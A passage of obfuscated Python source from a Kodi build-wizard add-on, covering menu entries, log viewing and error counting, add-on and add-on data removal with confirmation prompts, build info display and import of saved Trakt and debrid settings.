		OO0OO00OO000OOO00 .append ((THEME3 %'Clear Addon %s Data'%O0000OOO000O0O000 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OO00O00O0O0OO0OO0 ,OOO000O00OOOO0O00 )))#line:4151
	elif O000OOO0O00O0OO00 =='install':#line:4152
		OO0OO00OO000OOO00 =[]#line:4153
		OOO000O00OOOO0O00 =urllib .quote_plus (OOO00O00OO00OOO0O )#line:4154
		OO0OO00OO000OOO00 .append ((THEME2 %OOO00O00OO00OOO0O ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OOO000O00OOOO0O00 )))#line:4155
		OO0OO00OO000OOO00 .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OOO000O00OOOO0O00 )))#line:4156
		OO0OO00OO000OOO00 .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OOO000O00OOOO0O00 )))#line:4157
		OO0OO00OO000OOO00 .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OOO000O00OOOO0O00 )))#line:4158
		OO0OO00OO000OOO00 .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OOO000O00OOOO0O00 )))#line:4159
	OO0OO00OO000OOO00 .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4160
	return OO0OO00OO000OOO00 #line:4161
def toggleCache (OOO00O000OOO00000 ):#line:4163
	OO00000O00OOOOO0O =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4164
	OOO0OOO00O0OO00O0 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4165
	if OOO00O000OOO00000 in ['true','false']:#line:4166
		for OOO00000O00O0OOOO in OO00000O00OOOOO0O :#line:4167
			wiz .setS (OOO00000O00O0OOOO ,OOO00O000OOO00000 )#line:4168
	else :#line:4169
		if not OOO00O000OOO00000 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4170
			try :#line:4171
				OOO00000O00O0OOOO =OOO0OOO00O0OO00O0 [OO00000O00OOOOO0O .index (OOO00O000OOO00000 )]#line:4172
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OOO00000O00O0OOOO ))#line:4173
			except :#line:4174
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OOO00O000OOO00000 ))#line:4175
		else :#line:4176
			O0O0OOOOOOO000000 ='true'if wiz .getS (OOO00O000OOO00000 )=='false'else 'false'#line:4177
			wiz .setS (OOO00O000OOO00000 ,O0O0OOOOOOO000000 )#line:4178
def playVideo (OOOOO000OOOOOOO00 ):#line:4180
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OOOOO000OOOOOOO00 )#line:4181
	if 'watch?v='in OOOOO000OOOOOOO00 :#line:4182
		OOOOOO0O0O0O0O000 ,O0O0O0O0OOO0000O0 =OOOOO000OOOOOOO00 .split ('?')#line:4183
		O0OO00O0O000OOOO0 =O0O0O0O0OOO0000O0 .split ('&')#line:4184
		for OOO00OO0O00OOOO00 in O0OO00O0O000OOOO0 :#line:4185
			if OOO00OO0O00OOOO00 .startswith ('v='):#line:4186
				OOOOO000OOOOOOO00 =OOO00OO0O00OOOO00 [2 :]#line:4187
				break #line:4188
			else :continue #line:4189
	elif 'embed'in OOOOO000OOOOOOO00 or 'youtu.be'in OOOOO000OOOOOOO00 :#line:4190
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OOOOO000OOOOOOO00 )#line:4191
		OOOOOO0O0O0O0O000 =OOOOO000OOOOOOO00 .split ('/')#line:4192
		if len (OOOOOO0O0O0O0O000 [-1 ])>5 :#line:4193
			OOOOO000OOOOOOO00 =OOOOOO0O0O0O0O000 [-1 ]#line:4194
		elif len (OOOOOO0O0O0O0O000 [-2 ])>5 :#line:4195
			OOOOO000OOOOOOO00 =OOOOOO0O0O0O0O000 [-2 ]#line:4196
	wiz .log ("YouTube URL: %s"%OOOOO000OOOOOOO00 )#line:4197
	yt .PlayVideo (OOOOO000OOOOOOO00 )#line:4198
def viewLogFile ():#line:4200
	O0OO00OOOO000OOOO =wiz .Grab_Log (True )#line:4201
	O0O00O0OOOO0OOO00 =wiz .Grab_Log (True ,True )#line:4202
	O000O0O0OO0000000 =0 ;O0000OO000000O0OO =O0OO00OOOO000OOOO #line:4203
	if not O0O00O0OOOO0OOO00 ==False and not O0OO00OOOO000OOOO ==False :#line:4204
		O000O0O0OO0000000 =DIALOG .select (ADDONTITLE ,["View %s"%O0OO00OOOO000OOOO .replace (LOG ,""),"View %s"%O0O00O0OOOO0OOO00 .replace (LOG ,"")])#line:4205
		if O000O0O0OO0000000 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4206
	elif O0OO00OOOO000OOOO ==False and O0O00O0OOOO0OOO00 ==False :#line:4207
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4208
		return #line:4209
	elif not O0OO00OOOO000OOOO ==False :O000O0O0OO0000000 =0 #line:4210
	elif not O0O00O0OOOO0OOO00 ==False :O000O0O0OO0000000 =1 #line:4211
	O0000OO000000O0OO =O0OO00OOOO000OOOO if O000O0O0OO0000000 ==0 else O0O00O0OOOO0OOO00 #line:4213
	OOOOO0O0O0OO0OO00 =wiz .Grab_Log (False )if O000O0O0OO0000000 ==0 else wiz .Grab_Log (False ,True )#line:4214
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O0000OO000000O0OO ),OOOOO0O0O0OO0OO00 )#line:4216
def errorChecking (log =None ,count =None ,all =None ):#line:4218
	if log ==None :#line:4219
		OOO0OOOOOOOO00OO0 =wiz .Grab_Log (True )#line:4220
		OO00O0OO0O0O000O0 =wiz .Grab_Log (True ,True )#line:4221
		if not OO00O0OO0O0O000O0 ==False and not OOO0OOOOOOOO00OO0 ==False :#line:4222
			O00000OOOOO0OO0O0 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(OOO0OOOOOOOO00OO0 .replace (LOG ,""),errorChecking (OOO0OOOOOOOO00OO0 ,True ,True )),"View %s: %s error(s)"%(OO00O0OO0O0O000O0 .replace (LOG ,""),errorChecking (OO00O0OO0O0O000O0 ,True ,True ))])#line:4223
			if O00000OOOOO0OO0O0 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4224
		elif OOO0OOOOOOOO00OO0 ==False and OO00O0OO0O0O000O0 ==False :#line:4225
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4226
			return #line:4227
		elif not OOO0OOOOOOOO00OO0 ==False :O00000OOOOO0OO0O0 =0 #line:4228
		elif not OO00O0OO0O0O000O0 ==False :O00000OOOOO0OO0O0 =1 #line:4229
		log =OOO0OOOOOOOO00OO0 if O00000OOOOO0OO0O0 ==0 else OO00O0OO0O0O000O0 #line:4230
	if log ==False :#line:4231
		if count ==None :#line:4232
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4233
			return False #line:4234
		else :#line:4235
			return 0 #line:4236
	else :#line:4237
		if os .path .exists (log ):#line:4238
			O000OO0OOOO00OOOO =open (log ,mode ='r');O00OOOOO00O0OO000 =O000OO0OOOO00OOOO .read ().replace ('\n','').replace ('\r','');O000OO0OOOO00OOOO .close ()#line:4239
			O00O0O0OOOOOO00O0 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O00OOOOO00O0OO000 )#line:4240
			if not count ==None :#line:4241
				if all ==None :#line:4242
					OO0OO0O0O0000OO00 =0 #line:4243
					for O0O000O00OOO000O0 in O00O0O0OOOOOO00O0 :#line:4244
						if ADDON_ID in O0O000O00OOO000O0 :OO0OO0O0O0000OO00 +=1 #line:4245
					return OO0OO0O0O0000OO00 #line:4246
				else :return len (O00O0O0OOOOOO00O0 )#line:4247
			if len (O00O0O0OOOOOO00O0 )>0 :#line:4248
				OO0OO0O0O0000OO00 =0 ;OO00OOOOOO00O0O00 =""#line:4249
				for O0O000O00OOO000O0 in O00O0O0OOOOOO00O0 :#line:4250
					if all ==None and not ADDON_ID in O0O000O00OOO000O0 :continue #line:4251
					else :#line:4252
						OO0OO0O0O0000OO00 +=1 #line:4253
						OO00OOOOOO00O0O00 +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OO0OO0O0O0000OO00 ,O0O000O00OOO000O0 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4254
				if OO0OO0O0O0000OO00 >0 :#line:4255
					wiz .TextBox (ADDONTITLE ,OO00OOOOOO00O0O00 )#line:4256
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4257
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4258
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4259
ACTION_PREVIOUS_MENU =10 #line:4261
ACTION_NAV_BACK =92 #line:4262
ACTION_MOVE_LEFT =1 #line:4263
ACTION_MOVE_RIGHT =2 #line:4264
ACTION_MOVE_UP =3 #line:4265
ACTION_MOVE_DOWN =4 #line:4266
ACTION_MOUSE_WHEEL_UP =104 #line:4267
ACTION_MOUSE_WHEEL_DOWN =105 #line:4268
ACTION_MOVE_MOUSE =107 #line:4269
ACTION_SELECT_ITEM =7 #line:4270
ACTION_BACKSPACE =110 #line:4271
ACTION_MOUSE_LEFT_CLICK =100 #line:4272
ACTION_MOUSE_LONG_CLICK =108 #line:4273
def LogViewer (default =None ):#line:4275
	class O00O000000000O0O0 (xbmcgui .WindowXMLDialog ):#line:4276
		def __init__ (O0OOO0O00OO00O0OO ,*O00O0O0000OOO00OO ,**OOO0000OO000OO00O ):#line:4277
			O0OOO0O00OO00O0OO .default =OOO0000OO000OO00O ['default']#line:4278
		def onInit (O0OOO00O0O0OO00O0 ):#line:4280
			O0OOO00O0O0OO00O0 .title =101 #line:4281
			O0OOO00O0O0OO00O0 .msg =102 #line:4282
			O0OOO00O0O0OO00O0 .scrollbar =103 #line:4283
			O0OOO00O0O0OO00O0 .upload =201 #line:4284
			O0OOO00O0O0OO00O0 .kodi =202 #line:4285
			O0OOO00O0O0OO00O0 .kodiold =203 #line:4286
			O0OOO00O0O0OO00O0 .wizard =204 #line:4287
			O0OOO00O0O0OO00O0 .okbutton =205 #line:4288
			O0O00OOO000O00O00 =open (O0OOO00O0O0OO00O0 .default ,'r')#line:4289
			O0OOO00O0O0OO00O0 .logmsg =O0O00OOO000O00O00 .read ()#line:4290
			O0O00OOO000O00O00 .close ()#line:4291
			O0OOO00O0O0OO00O0 .titlemsg ="%s: %s"%(ADDONTITLE ,O0OOO00O0O0OO00O0 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4292
			O0OOO00O0O0OO00O0 .showdialog ()#line:4293
		def showdialog (OOOO0O00O0O0O000O ):#line:4295
			OOOO0O00O0O0O000O .getControl (OOOO0O00O0O0O000O .title ).setLabel (OOOO0O00O0O0O000O .titlemsg )#line:4296
			OOOO0O00O0O0O000O .getControl (OOOO0O00O0O0O000O .msg ).setText (wiz .highlightText (OOOO0O00O0O0O000O .logmsg ))#line:4297
			OOOO0O00O0O0O000O .setFocusId (OOOO0O00O0O0O000O .scrollbar )#line:4298
		def onClick (O0O0000OOO00OOO0O ,O0O0O0OO0OOOOO000 ):#line:4300
			if O0O0O0OO0OOOOO000 ==O0O0000OOO00OOO0O .okbutton :O0O0000OOO00OOO0O .close ()#line:4301
			elif O0O0O0OO0OOOOO000 ==O0O0000OOO00OOO0O .upload :O0O0000OOO00OOO0O .close ();uploadLog .Main ()#line:4302
			elif O0O0O0OO0OOOOO000 ==O0O0000OOO00OOO0O .kodi :#line:4303
				O0O0O00O0O000O0OO =wiz .Grab_Log (False )#line:4304
				O00OO0O00OOO0OOOO =wiz .Grab_Log (True )#line:4305
				if O0O0O00O0O000O0OO ==False :#line:4306
					O0O0000OOO00OOO0O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4307
					O0O0000OOO00OOO0O .getControl (O0O0000OOO00OOO0O .msg ).setText ("Log File Does Not Exists!")#line:4308
				else :#line:4309
					O0O0000OOO00OOO0O .titlemsg ="%s: %s"%(ADDONTITLE ,O00OO0O00OOO0OOOO .replace (LOG ,''))#line:4310
					O0O0000OOO00OOO0O .getControl (O0O0000OOO00OOO0O .title ).setLabel (O0O0000OOO00OOO0O .titlemsg )#line:4311
					O0O0000OOO00OOO0O .getControl (O0O0000OOO00OOO0O .msg ).setText (wiz .highlightText (O0O0O00O0O000O0OO ))#line:4312
					O0O0000OOO00OOO0O .setFocusId (O0O0000OOO00OOO0O .scrollbar )#line:4313
			elif O0O0O0OO0OOOOO000 ==O0O0000OOO00OOO0O .kodiold :#line:4314
				O0O0O00O0O000O0OO =wiz .Grab_Log (False ,True )#line:4315
				O00OO0O00OOO0OOOO =wiz .Grab_Log (True ,True )#line:4316
				if O0O0O00O0O000O0OO ==False :#line:4317
					O0O0000OOO00OOO0O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4318
					O0O0000OOO00OOO0O .getControl (O0O0000OOO00OOO0O .msg ).setText ("Log File Does Not Exists!")#line:4319
				else :#line:4320
					O0O0000OOO00OOO0O .titlemsg ="%s: %s"%(ADDONTITLE ,O00OO0O00OOO0OOOO .replace (LOG ,''))#line:4321
					O0O0000OOO00OOO0O .getControl (O0O0000OOO00OOO0O .title ).setLabel (O0O0000OOO00OOO0O .titlemsg )#line:4322
					O0O0000OOO00OOO0O .getControl (O0O0000OOO00OOO0O .msg ).setText (wiz .highlightText (O0O0O00O0O000O0OO ))#line:4323
					O0O0000OOO00OOO0O .setFocusId (O0O0000OOO00OOO0O .scrollbar )#line:4324
			elif O0O0O0OO0OOOOO000 ==O0O0000OOO00OOO0O .wizard :#line:4325
				O0O0O00O0O000O0OO =wiz .Grab_Log (False ,False ,True )#line:4326
				O00OO0O00OOO0OOOO =wiz .Grab_Log (True ,False ,True )#line:4327
				if O0O0O00O0O000O0OO ==False :#line:4328
					O0O0000OOO00OOO0O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4329
					O0O0000OOO00OOO0O .getControl (O0O0000OOO00OOO0O .msg ).setText ("Log File Does Not Exists!")#line:4330
				else :#line:4331
					O0O0000OOO00OOO0O .titlemsg ="%s: %s"%(ADDONTITLE ,O00OO0O00OOO0OOOO .replace (ADDONDATA ,''))#line:4332
					O0O0000OOO00OOO0O .getControl (O0O0000OOO00OOO0O .title ).setLabel (O0O0000OOO00OOO0O .titlemsg )#line:4333
					O0O0000OOO00OOO0O .getControl (O0O0000OOO00OOO0O .msg ).setText (wiz .highlightText (O0O0O00O0O000O0OO ))#line:4334
					O0O0000OOO00OOO0O .setFocusId (O0O0000OOO00OOO0O .scrollbar )#line:4335
		def onAction (OO00OOO0O000OO0O0 ,O0OOOOOOOOOOO0000 ):#line:4337
			if O0OOOOOOOOOOO0000 ==ACTION_PREVIOUS_MENU :OO00OOO0O000OO0O0 .close ()#line:4338
			elif O0OOOOOOOOOOO0000 ==ACTION_NAV_BACK :OO00OOO0O000OO0O0 .close ()#line:4339
	if default ==None :default =wiz .Grab_Log (True )#line:4340
	OOO0O0O00O0OOO0O0 =O00O000000000O0O0 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4341
	OOO0O0O00O0OOO0O0 .doModal ()#line:4342
	del OOO0O0O00O0OOO0O0 #line:4343
def removeAddon (O0OOOO00O000OOOOO ,OO0O0000OO0O0O000 ,over =False ):#line:4345
	if not over ==False :#line:4346
		OOO0OOO0OO0O0OOOO =1 #line:4347
	else :#line:4348
		OOO0OOO0OO0O0OOOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0O0000OO0O0O000 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O0OOOO00O000OOOOO ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4349
	if OOO0OOO0OO0O0OOOO ==1 :#line:4350
		OO000O00O0000O000 =os .path .join (ADDONS ,O0OOOO00O000OOOOO )#line:4351
		wiz .log ("Removing Addon %s"%O0OOOO00O000OOOOO )#line:4352
		wiz .cleanHouse (OO000O00O0000O000 )#line:4353
		xbmc .sleep (1000 )#line:4354
		try :shutil .rmtree (OO000O00O0000O000 )#line:4355
		except Exception as O00O0OO0OOO0OO0OO :wiz .log ("Error removing %s"%O0OOOO00O000OOOOO ,xbmc .LOGNOTICE )#line:4356
		removeAddonData (O0OOOO00O000OOOOO ,OO0O0000OO0O0O000 ,over )#line:4357
	if over ==False :#line:4358
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OO0O0000OO0O0O000 ))#line:4359
def removeAddonData (OOOO0OO000O0OO0O0 ,name =None ,over =False ):#line:4361
	if OOOO0OO000O0OO0O0 =='all':#line:4362
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4363
			wiz .cleanHouse (ADDOND )#line:4364
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4365
	elif OOOO0OO000O0OO0O0 =='uninstalled':#line:4366
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4367
			O000O0000O000OOO0 =0 #line:4368
			for OOOO0OO00000O0000 in glob .glob (os .path .join (ADDOND ,'*')):#line:4369
				OOO0OOOO000O00OO0 =OOOO0OO00000O0000 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4370
				if OOO0OOOO000O00OO0 in EXCLUDES :pass #line:4371
				elif os .path .exists (os .path .join (ADDONS ,OOO0OOOO000O00OO0 )):pass #line:4372
				else :wiz .cleanHouse (OOOO0OO00000O0000 );O000O0000O000OOO0 +=1 ;wiz .log (OOOO0OO00000O0000 );shutil .rmtree (OOOO0OO00000O0000 )#line:4373
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O000O0000O000OOO0 ))#line:4374
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4375
	elif OOOO0OO000O0OO0O0 =='empty':#line:4376
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4377
			O000O0000O000OOO0 =wiz .emptyfolder (ADDOND )#line:4378
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O000O0000O000OOO0 ))#line:4379
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4380
	else :#line:4381
		O0O000OO000OOO0OO =os .path .join (USERDATA ,'addon_data',OOOO0OO000O0OO0O0 )#line:4382
		if OOOO0OO000O0OO0O0 in EXCLUDES :#line:4383
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4384
		elif os .path .exists (O0O000OO000OOO0OO ):#line:4385
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOO0OO000O0OO0O0 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4386
				wiz .cleanHouse (O0O000OO000OOO0OO )#line:4387
				try :#line:4388
					shutil .rmtree (O0O000OO000OOO0OO )#line:4389
				except :#line:4390
					wiz .log ("Error deleting: %s"%O0O000OO000OOO0OO )#line:4391
			else :#line:4392
				wiz .log ('Addon data for %s was not removed'%OOOO0OO000O0OO0O0 )#line:4393
	wiz .refresh ()#line:4394
def restoreit (OOOOO0O0000OO0OOO ):#line:4396
	if OOOOO0O0000OO0OOO =='build':#line:4397
		O00000OO0O000O0O0 =freshStart ('restore')#line:4398
		if O00000OO0O000O0O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4399
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4400
		wiz .skinToDefault ()#line:4401
	wiz .restoreLocal (OOOOO0O0000OO0OOO )#line:4402
def restoreextit (OO00OOOO0000000O0 ):#line:4404
	if OO00OOOO0000000O0 =='build':#line:4405
		O0OO0OO0OOO0OOO0O =freshStart ('restore')#line:4406
		if O0OO0OO0OOO0OOO0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4407
	wiz .restoreExternal (OO00OOOO0000000O0 )#line:4408
def buildInfo (O000O0OOOOOOOOO0O ):#line:4410
	if wiz .workingURL (SPEEDFILE )==True :#line:4411
		if wiz .checkBuild (O000O0OOOOOOOOO0O ,'url'):#line:4412
			O000O0OOOOOOOOO0O ,OO0000O0OO0OOO0O0 ,OO0OO000OO00O00OO ,O0O0OOOO0000O0OOO ,O00000OOO00O0O0O0 ,O0O00O0O0OOO00O00 ,OO000O0O0O0OO00O0 ,O0OOOO000OOOO0000 ,OO0OOOOOO00000O00 ,OOO0O0O00OOO0000O ,O00O0OOO0O00OOOOO =wiz .checkBuild (O000O0OOOOOOOOO0O ,'all')#line:4413
			OOO0O0O00OOO0000O ='Yes'if OOO0O0O00OOO0000O .lower ()=='yes'else 'No'#line:4414
			OO0OO00OOOOOOO00O ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O000O0OOOOOOOOO0O )#line:4415
			OO0OO00OOOOOOO00O +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0000O0OO0OOO0O0 )#line:4416
			if not O0O00O0O0OOO00O00 =="http://":#line:4417
				OO0O00OO0OOOO00O0 =wiz .themeCount (O000O0OOOOOOOOO0O ,False )#line:4418
				OO0OO00OOOOOOO00O +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OO0O00OO0OOOO00O0 ))#line:4419
			OO0OO00OOOOOOO00O +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00000OOO00O0O0O0 )#line:4420
			OO0OO00OOOOOOO00O +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO0O0O00OOO0000O )#line:4421
			OO0OO00OOOOOOO00O +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00O0OOO0O00OOOOO )#line:4422
			wiz .TextBox (ADDONTITLE ,OO0OO00OOOOOOO00O )#line:4423
		else :wiz .log ("Invalid Build Name!")#line:4424
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4425
def buildVideo (O0000OO0O0OOO0O00 ):#line:4427
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4428
	if wiz .workingURL (SPEEDFILE )==True :#line:4429
		OOO0OOOOO00O000OO =wiz .checkBuild (O0000OO0O0OOO0O00 ,'preview')#line:4430
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O0000OO0O0OOO0O00 )#line:4431
		if OOO0OOOOO00O000OO and not OOO0OOOOO00O000OO =='http://':playVideo (OOO0OOOOO00O000OO )#line:4432
		else :wiz .log ("[%s]Unable to find url for video preview"%O0000OO0O0OOO0O00 )#line:4433
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4434
def dependsList (OOO000OOOO0O000O0 ):#line:4436
	OOO00000OO00OOO0O =os .path .join (ADDONS ,OOO000OOOO0O000O0 ,'addon.xml')#line:4437
	if os .path .exists (OOO00000OO00OOO0O ):#line:4438
		O000OOO0OOOO0O000 =open (OOO00000OO00OOO0O ,mode ='r');O0OO000O000O000OO =O000OOO0OOOO0O000 .read ();O000OOO0OOOO0O000 .close ();#line:4439
		OO00OO0OOO0OOO0OO =wiz .parseDOM (O0OO000O000O000OO ,'import',ret ='addon')#line:4440
		OOO0OOOOOO0000OOO =[]#line:4441
		for O0OOO0O0O0O000O0O in OO00OO0OOO0OOO0OO :#line:4442
			if not 'xbmc.python'in O0OOO0O0O0O000O0O :#line:4443
				OOO0OOOOOO0000OOO .append (O0OOO0O0O0O000O0O )#line:4444
		return OOO0OOOOOO0000OOO #line:4445
	return []#line:4446
def manageSaveData (OOO000O0O00OO00O0 ):#line:4448
	if OOO000O0O00OO00O0 =='import':#line:4449
		OO00OO0OO0OOO0OOO =os .path .join (ADDONDATA ,'temp')#line:4450
		if not os .path .exists (OO00OO0OO0OOO0OOO ):os .makedirs (OO00OO0OO0OOO0OOO )#line:4451
		OOO000OOOO0O00O0O =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4452
		if not OOO000OOOO0O00O0O .endswith ('.zip'):#line:4453
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4454
			return #line:4455
		OOOOO000O00O0OO00 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4456
		O00O0000000OO0O00 =xbmcvfs .copy (OOO000OOOO0O00O0O ,OOOOO000O00O0OO00 )#line:4457
		wiz .log ("%s"%str (O00O0000000OO0O00 ))#line:4458
		extract .all (xbmc .translatePath (OOOOO000O00O0OO00 ),OO00OO0OO0OOO0OOO )#line:4459
		OOOOOO00O00OO0OOO =os .path .join (OO00OO0OO0OOO0OOO ,'trakt')#line:4460
		O00OO000O0O00OO0O =os .path .join (OO00OO0OO0OOO0OOO ,'login')#line:4461
		O0O00OO00O00OO00O =os .path .join (OO00OO0OO0OOO0OOO ,'debrid')#line:4462
		OOOO00O00O0OO0O0O =0 #line:4463
		if os .path .exists (OOOOOO00O00OO0OOO ):#line:4464
			OOOO00O00O0OO0O0O +=1 #line:4465
			O00OOOOO0O0OOOO0O =os .listdir (OOOOOO00O00OO0OOO )#line:4466
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4467
			for OOOOO0O0O000O0O00 in O00OOOOO0O0OOOO0O :#line:4468
				OOO0O0000000OO0O0 =os .path .join (traktit .TRAKTFOLD ,OOOOO0O0O000O0O00 )#line:4469
				O0OOO0O0OO0OOOOOO =os .path .join (OOOOOO00O00OO0OOO ,OOOOO0O0O000O0O00 )#line:4470
				if os .path .exists (OOO0O0000000OO0O0 ):#line:4471
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOOOO0O0O000O0O00 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4472
